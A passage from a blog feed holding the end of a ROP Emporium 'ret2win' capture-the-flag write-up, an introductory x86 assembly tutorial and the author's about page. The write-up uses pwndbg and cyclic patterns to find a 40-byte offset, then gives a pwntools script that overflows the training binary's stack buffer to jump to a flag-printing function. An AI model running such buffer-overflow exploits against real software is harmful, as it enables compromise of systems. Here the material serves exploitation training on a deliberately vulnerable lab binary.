│ 0x0040075a bf26094000 mov edi, str.Well_done__Here_s_your_flag: ; 0x400926 ; &lt;span style="color:#e6db74">&amp;#34;Well done! Here&amp;#39;s your flag:&amp;#34;&lt;/span> ; const char *s
│ 0x0040075f e8ecfdffff call sym.imp.puts ; int puts&lt;span style="color:#f92672">(&lt;/span>const char *s&lt;span style="color:#f92672">)&lt;/span>
│ 0x00400764 bf43094000 mov edi, str.bin_cat_flag.txt ; 0x400943 ; &lt;span style="color:#e6db74">&amp;#34;/bin/cat flag.txt&amp;#34;&lt;/span> ; const char *string
│ 0x00400769 e8f2fdffff call sym.imp.system ; int system&lt;span style="color:#f92672">(&lt;/span>const char *string&lt;span style="color:#f92672">)&lt;/span>
│ 0x0040076e &lt;span style="color:#ae81ff">90&lt;/span> nop
│ 0x0040076f 5d pop rbp
└ 0x00400770 c3 ret
&lt;span style="color:#f92672">[&lt;/span>0x00400756&lt;span style="color:#f92672">]&lt;/span>&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Its prints the flag this is the exact thing we wanted to do!&lt;/p>
&lt;p>Now lets find the offset that&amp;rsquo;ll be needed to overwrite the instruction pointer&lt;/p>
&lt;p>for the pattern value we&amp;rsquo;ll use cyclic from pwntools to find the offset&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-terminal" data-lang="terminal">ret2win64 ➤ cyclic 60
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
ret2win64 ➤ ./ret2win
ret2win by ROP Emporium
x86_64
For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!
&amp;gt; aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
Thank you!
[1] 34640 segmentation fault (core dumped) ./ret2win
&lt;/code>&lt;/pre>&lt;p>Now on passing the pattern we get a segfault let&amp;rsquo;s do the same with pwndbg&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ pwndbg ./ret2win
pwndbg: loaded &lt;span style="color:#ae81ff">193&lt;/span> commands. Type pwndbg &lt;span style="color:#f92672">[&lt;/span>filter&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> a list.
pwndbg: created $rebase, $ida gdb functions &lt;span style="color:#f92672">(&lt;/span>can be used with print/break&lt;span style="color:#f92672">)&lt;/span>
Reading symbols from ./ret2win...
&lt;span style="color:#f92672">(&lt;/span>No debugging symbols found in ./ret2win&lt;span style="color:#f92672">)&lt;/span>
pwndbg&amp;gt; break *main+80
Breakpoint &lt;span style="color:#ae81ff">1&lt;/span> at 0x4006e7
pwndbg&amp;gt; r
Starting program: /home/h4x5p4c3/Documents/pwn/rop_emporium/0-ret2win/ret2win64/ret2win
ret2win by ROP Emporium
x86_64
For my first trick, I will attempt to fit &lt;span style="color:#ae81ff">56&lt;/span> bytes of user input into &lt;span style="color:#ae81ff">32&lt;/span> bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don&lt;span style="color:#e6db74">&amp;#39;t worry about null bytes, we&amp;#39;&lt;/span>re using read&lt;span style="color:#f92672">()&lt;/span>!
&amp;gt; aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
Thank you!
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400755 in pwnme &lt;span style="color:#f92672">()&lt;/span>
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────&lt;span style="color:#f92672">[&lt;/span> REGISTERS &lt;span style="color:#f92672">]&lt;/span>───────────────────────────────────────────────────────────────────────────
RAX 0xb
RBX 0x0
RCX 0x7ffff7ecaf67 &lt;span style="color:#f92672">(&lt;/span>write+23&lt;span style="color:#f92672">)&lt;/span> ◂— cmp rax, -0x1000 /* &lt;span style="color:#e6db74">&amp;#39;H=&amp;#39;&lt;/span> */
RDX 0x0
RDI 0x7ffff7f9f4f0 &lt;span style="color:#f92672">(&lt;/span>_IO_stdfile_1_lock&lt;span style="color:#f92672">)&lt;/span> ◂— 0x0
RSI 0x7ffff7f9d5a3 &lt;span style="color:#f92672">(&lt;/span>_IO_2_1_stdout_+131&lt;span style="color:#f92672">)&lt;/span> ◂— 0xf9f4f0000000000a /* &lt;span style="color:#e6db74">&amp;#39;\n&amp;#39;&lt;/span> */
R8 0xb
R9 0x7ffff7fe14c0 &lt;span style="color:#f92672">(&lt;/span>_dl_fini&lt;span style="color:#f92672">)&lt;/span> ◂— endbr64
R10 0xfffffffffffff8f9
R11 0x246
R12 0x4005b0 &lt;span style="color:#f92672">(&lt;/span>_start&lt;span style="color:#f92672">)&lt;/span> ◂— xor ebp, ebp
R13 0x0
R14 0x0
R15 0x0
RBP 0x6161616a61616169 &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;iaaajaaa&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
RSP 0x7fffffffe8b8 ◂— 0x6161616c6161616b &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;kaaalaaa&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
RIP 0x400755 &lt;span style="color:#f92672">(&lt;/span>pwnme+109&lt;span style="color:#f92672">)&lt;/span> ◂— ret
────────────────────────────────────────────────────────────────────────────&lt;span style="color:#f92672">[&lt;/span> DISASM &lt;span style="color:#f92672">]&lt;/span>─────────────────────────────────────────────────────────────────────────────
► 0x400755 &amp;lt;pwnme+109&amp;gt; ret &amp;lt;0x6161616c6161616b&amp;gt;
─────────────────────────────────────────────────────────────────────────────&lt;span style="color:#f92672">[&lt;/span> STACK &lt;span style="color:#f92672">]&lt;/span>─────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe8b8 ◂— 0x6161616c6161616b &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;kaaalaaa&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
01:0008│ 0x7fffffffe8c0 ◂— 0x6161616e6161616d &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;maaanaaa&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
02:0010│ 0x7fffffffe8c8 —▸ 0x7ffff7e02152 &lt;span style="color:#f92672">(&lt;/span>__libc_start_main+242&lt;span style="color:#f92672">)&lt;/span> ◂— mov edi, eax
03:0018│ 0x7fffffffe8d0 —▸ 0x7fffffffe9b8 —▸ 0x7fffffffec2c ◂— &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/0-ret2win/ret2win64/ret2win&amp;#39;&lt;/span>
04:0020│ 0x7fffffffe8d8 ◂— 0x1f7e01f73
05:0028│ 0x7fffffffe8e0 —▸ 0x400697 &lt;span style="color:#f92672">(&lt;/span>main&lt;span style="color:#f92672">)&lt;/span> ◂— push rbp
06:0030│ 0x7fffffffe8e8 ◂— 0x400000000
07:0038│ 0x7fffffffe8f0 ◂— 0x0
───────────────────────────────────────────────────────────────────────────&lt;span style="color:#f92672">[&lt;/span> BACKTRACE &lt;span style="color:#f92672">]&lt;/span>───────────────────────────────────────────────────────────────────────────
► f &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">400755&lt;/span> pwnme+109
f &lt;span style="color:#ae81ff">1&lt;/span> 6161616c6161616b
f &lt;span style="color:#ae81ff">2&lt;/span> 6161616e6161616d
f &lt;span style="color:#ae81ff">3&lt;/span> 7ffff7e02152 __libc_start_main+242
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&amp;gt; x/wx $rsp
0x7fffffffe8b8: 0x6161616b
pwndbg&amp;gt; q
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now lets find out the offset to overwrite the RIP&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">In &lt;span style="color:#f92672">[&lt;/span>1&lt;span style="color:#f92672">]&lt;/span>: from pwn import *
In &lt;span style="color:#f92672">[&lt;/span>2&lt;span style="color:#f92672">]&lt;/span>: cyclic_find&lt;span style="color:#f92672">(&lt;/span>0x6161616b&lt;span style="color:#f92672">)&lt;/span>
Out&lt;span style="color:#f92672">[&lt;/span>2&lt;span style="color:#f92672">]&lt;/span>: &lt;span style="color:#ae81ff">40&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we know the offset is 40 let&amp;rsquo;s craft our exploit but we notice there&amp;rsquo;s actually a hint give the webpage saying&lt;/p>
&lt;pre tabindex="0">&lt;code>It's worth confirming this before each challenge but typically you'll need 40 bytes of garbage to reach the saved return address in the 64bit binaries, 44 bytes in the 32bit binaries
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3 &lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./ret2win&amp;#39;&lt;/span>)
io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
payload &lt;span style="color:#f92672">=&lt;/span> flat([cyclic(&lt;span style="color:#ae81ff">40&lt;/span>), exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;ret2win&amp;#39;&lt;/span>]])
io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
io&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>so now we run the exploit to check if it works :)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ ./exploit
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/0-ret2win/ret2win64/ret2win&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/0-ret2win/ret2win64/ret2win&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">23220&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
ret2win by ROP Emporium
x86_64
For my first trick, I will attempt to fit &lt;span style="color:#ae81ff">56&lt;/span> bytes of user input into &lt;span style="color:#ae81ff">32&lt;/span> bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don&lt;span style="color:#e6db74">&amp;#39;t worry about null bytes, we&amp;#39;&lt;/span>re using read&lt;span style="color:#f92672">()&lt;/span>!
&amp;gt; Thank you!
Well &lt;span style="color:#66d9ef">done&lt;/span>! Here&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>s your flag:
ROPE&lt;span style="color:#f92672">{&lt;/span>a_placeholder_32byte_flag!&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Got EOF &lt;span style="color:#66d9ef">while&lt;/span> reading in interactive
$
&lt;/code>&lt;/pre>&lt;/div>&lt;p>yea we got our flag. So on the next post we&amp;rsquo;ll not cover how to find the offset and we did in this one&lt;/p></content></item><item><title>Introduction to asm</title><link>/posts/intro-to-asmx86/</link><pubDate>Thu, 13 Aug 2020 00:00:00 +0000</pubDate><guid>/posts/intro-to-asmx86/</guid><description>What is assembly language ? A processor understands only machine language instructions which are strings of 1&amp;rsquo;s and 0&amp;rsquo;s. Assembly language is basically just a wrapper on top of machine code. However machine language is too obscure and complex to understand so low level assembly language is designed for specific family of processors.
Each family of processors have its own set of instructions for handling various operations. These set of instructions are called machine-language-instructions.</description><content>&lt;h2 id="what-is-assembly-language-">What is assembly language ?&lt;/h2>
&lt;p>A processor understands only machine language instructions which are strings of 1&amp;rsquo;s and 0&amp;rsquo;s. Assembly language is
basically just a wrapper on top of machine code. However machine language is too obscure and complex to understand so low level assembly language is designed for specific family of processors.&lt;/p>
&lt;p>Each family of processors have its own set of instructions for handling various operations. These set of instructions are
called machine-language-instructions.&lt;/p>
&lt;h2 id="x86-registers">x86 Registers!&lt;/h2>
&lt;pre>&lt;code>x86 processors have 8, 32-bit general purpose registers
&lt;/code>&lt;/pre>
&lt;p>EAX is called as the accumulator since it does number of arithmetic operations. In division and multiplication,
one of the numbers must be in AX(32-bit) or AL(16-bit)&lt;/p>
&lt;pre>&lt;code>AX - primary accumulator =&amp;gt; AH, AL
&lt;/code>&lt;/pre>
&lt;p>EBX is called as the base index (eg:arrays) holds the address of the base storage location from where
the data is stored continuously. Base register value is used to find the data that is required.&lt;/p>
&lt;pre>&lt;code>BX - base register =&amp;gt; BH, BL
&lt;/code>&lt;/pre>
&lt;p>ECX is known as the counter as it&amp;rsquo;s used to hold a loop index. While shifting and rotating bits CX is used as counter.&lt;/p>
&lt;pre>&lt;code>CX - counter register =&amp;gt; CH, CL
&lt;/code>&lt;/pre>
&lt;p>EDX is the data register is used in I/O operations as well as preferred in division and multiplication
while execution of large values.(DX and DL)&lt;/p>
&lt;pre>&lt;code>DX - data register =&amp;gt; DH, DL
&lt;/code>&lt;/pre>
&lt;p>ESI - used for string operations as source index&lt;/p>
&lt;pre>&lt;code>SI - source index
&lt;/code>&lt;/pre>
&lt;p>EDI - used for string operations as destination index&lt;/p>
&lt;pre>&lt;code>DI - destinaton index
&lt;/code>&lt;/pre>
&lt;p>The registers [ EAX, EBX, ECX, EDX ] can be used as subsections as shown in EAX, it contains a 16bit register AX which is split into two 8 bit registers again AH and AL&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">32-bit register &lt;span style="color:#f92672">[&lt;/span>EAX, EBX, ECX, EDX, ESI, EDI, ESP, or EBP&lt;span style="color:#f92672">]&lt;/span>
16-bit register &lt;span style="color:#f92672">[&lt;/span>AX, BX, CX, or DX&lt;span style="color:#f92672">]&lt;/span>
8-bit register &lt;span style="color:#f92672">[&lt;/span>AH, BH, CH, DH, AL, BL, CL, or DL&lt;span style="color:#f92672">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>An assembly program can be split into three sections&lt;/p>
&lt;ul>
&lt;li>The data section&lt;/li>
&lt;li>The bss section&lt;/li>
&lt;li>the text section&lt;/li>
&lt;/ul>
&lt;h2 id="the-data-section">The data section&lt;/h2>
&lt;p>The data section is used for declaring initialized data or constant values, file names or buffer size. This data doesn&amp;rsquo;t change at runtime&lt;/p>
&lt;pre tabindex="0">&lt;code>section.data ;(syntax for declaration)
&lt;/code>&lt;/pre>&lt;h2 id="the-bss-section">The bss section&lt;/h2>
&lt;p>The bss section is used for declaring variables&lt;/p>
&lt;pre tabindex="0">&lt;code>section.bss ;(syntax for declaration)
&lt;/code>&lt;/pre>&lt;h2 id="the-text-section">The text section&lt;/h2>
&lt;p>The text section contains the actual code this begins with a declaration global _start
which tells the kernel where the execution of program begins&lt;/p>
&lt;pre tabindex="0">&lt;code>section.text
global _start ;(syntax for declaration)
_start:
&lt;/code>&lt;/pre>&lt;h2 id="stack">STACK&lt;/h2>
&lt;p>It is an abstract data structure which consists of information in a Last In First Out system(LIFO). You put arbitrary objects onto the stack and then you take them off again, much like an in/out tray, the top item is always the one that is taken off and you always put on to the top.&lt;/p>
&lt;p>It generally has a static size per program and frequently used to store function parameters. You push the parameters onto the stack when you call a function and the function either address the stack directly or pops off the variables from the stack.&lt;/p>
&lt;p>&lt;img src="/images/stack-convention.png" alt="">&lt;/p>
&lt;h2 id="function-prologue-and-epilogue">Function prologue and epilogue&lt;/h2>
&lt;p>The prolouge is what happens at the beginning of a function. Its responsibility is to set up the stack frame of the called function. The epilogue is the exact opposite: it is what happens last in a function, and its purpose is to restore the stack frame of the called (parent) function.&lt;/p>
&lt;p>In x86, the ebp register is used by the language to keep track of the function&amp;rsquo;s stack frame. The esp register is used by the processor to point to the most recent addition (the top value) on the stack.&lt;/p>
&lt;p>The call instruction does two things: First it pushes the return address onto the stack, then it jumps to the function being called. Immediately after the call, esp points to the return address on the stack.&lt;/p>
&lt;p>Then the prologue is executed:&lt;/p>
&lt;p>&lt;code>push ebp ; Save the stack-frame base pointer (of the calling function).&lt;/code>&lt;/p>
&lt;p>&lt;code>mov ebp, esp ; Set the stack-frame base pointer to be the current&lt;/code>&lt;/p>
&lt;p>&lt;code> ; location on the stack.&lt;/code>&lt;/p>
&lt;p>&lt;code>sub esp, N ; Grow the stack by N bytes to reserve space for local variables&lt;/code>&lt;/p>
&lt;p>At this point, we have:&lt;/p>
&lt;pre tabindex="0">&lt;code>
ebp + 4: Return address
ebp + 0: Calling function's old ebp value
ebp - 4: (local variables)
&lt;/code>&lt;/pre>&lt;p>The epilogue:&lt;/p>
&lt;pre tabindex="0">&lt;code>mov esp, ebp ; Put the stack pointer back where it was when this function is called
pop ebp ; Restore the calling function's stack frame.
ret ; Return to the calling function.
&lt;/code>&lt;/pre>&lt;h2 id="instructions">Instructions&lt;/h2>
&lt;p>There are some basic intructions in assembly language such as add, sub, mul, div&lt;/p>
&lt;h2 id="add">ADD&lt;/h2>
&lt;p>add instruction is used to add two numbers together. You can use it to add a value directly to memory or to a register&lt;/p>
&lt;p>Eg: &lt;code>mov rax, 0x1 ;; rax equals to 0x1&lt;/code>&lt;/p>
&lt;pre>&lt;code>mov rbx, 0x2 ;; rbx equals to 0x2
add rbx, rax ;; rbx + rax equals to 0x3
&lt;/code>&lt;/pre>
&lt;h2 id="sub">SUB&lt;/h2>
&lt;p>sub instruction is the opposite of add as you might guessed it now it is used to subtract&lt;/p>
&lt;p>Eg: &lt;code>mov rax, 0x1 ;; rax equals to 0x1&lt;/code>&lt;/p>
&lt;pre>&lt;code> mov rbx, 0x2 ;; rbx equals to 0x2
sub rbx, rax ;; rbx -= rax =&amp;gt; rbx = 0x2 - 0x1 = 0x1
&lt;/code>&lt;/pre>
&lt;h2 id="mul">MUL&lt;/h2>
&lt;p>mul instruction is used to perform multiplication. The result is is stored in rax implictily&lt;/p>
&lt;p>Eg: &lt;code>mov rax 0x2&lt;/code>&lt;/p>
&lt;pre>&lt;code>mov rbx 0x2
mul rbx ;; rax = rax * rbx = 0x2 * 0x2 = 0x4
&lt;/code>&lt;/pre>
&lt;p>we can also multiply &lt;code>rax&lt;/code> with itself&lt;/p>
&lt;p>&lt;code>mov rax 0x2&lt;/code>&lt;/p>
&lt;p>&lt;code>mul rax ;; equals rax * rax = 0x4&lt;/code>&lt;/p>
&lt;h2 id="div">DIV&lt;/h2>
&lt;p>divides the contents&lt;/p>
&lt;p>&lt;code>mov edx, 0 ; clear dividend&lt;/code>&lt;/p>
&lt;p>&lt;code>mov eax, 0x8003 ; dividend&lt;/code>&lt;/p>
&lt;p>&lt;code>mov ecx, 0x100 ; divisor&lt;/code>&lt;/p>
&lt;p>&lt;code>div ecx ; EAX = 0x80, EDX = 0x3&lt;/code>&lt;/p></content></item><item><title/><link>/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/about/</guid><description>Heyyy there! I&amp;rsquo;m jones martin better known as h4x5p4c3 and haxy
Who Am I? I&amp;rsquo;m a computer science freshman at SIST
What Do I Do? I&amp;rsquo;m very much interested in reverse engineering and binary exploitation. I play CTF&amp;rsquo;s with zh3r0
Anythin else? I love customizing tiling window managers and i like rustlang 🦀
How To Reach Me Out?
Twitter h4x5p4c3 Github h4x5p4c3 Discord - h4x5p4c3#7079</description><content>&lt;h2 id="heyyy-there">Heyyy there!&lt;/h2>
&lt;p>I&amp;rsquo;m &lt;strong>jones martin&lt;/strong> better known as &lt;code>h4x5p4c3&lt;/code> and &lt;code>haxy&lt;/code>&lt;/p>
&lt;p>&lt;strong>Who Am I?&lt;/strong> I&amp;rsquo;m a computer science freshman at &lt;a href="https://www.sathyabama.ac.in/">SIST&lt;/a>&lt;/p>
&lt;p>&lt;strong>What Do I Do?&lt;/strong> I&amp;rsquo;m very much interested in reverse engineering and binary exploitation. I play &lt;a href="https://ctf101.org/">CTF&amp;rsquo;s&lt;/a>
with &lt;a href="https://www.zh3r0.com/">zh3r0&lt;/a>&lt;/p>
&lt;p>&lt;strong>Anythin else?&lt;/strong> I love customizing tiling window managers and i like &lt;a href="https://www.rust-lang.org/">rustlang&lt;/a> 🦀&lt;/p>
&lt;p>&lt;strong>How To Reach Me Out?&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Twitter &lt;a href="https://twitter.com/h4x5p4c3">h4x5p4c3&lt;/a>&lt;/li>
&lt;li>Github &lt;a href="https://github.com/h4x5p4c3/">h4x5p4c3&lt;/a>&lt;/li>
&lt;li>Discord - h4x5p4c3#7079&lt;/li>
&lt;/ul></content></item></channel></rss>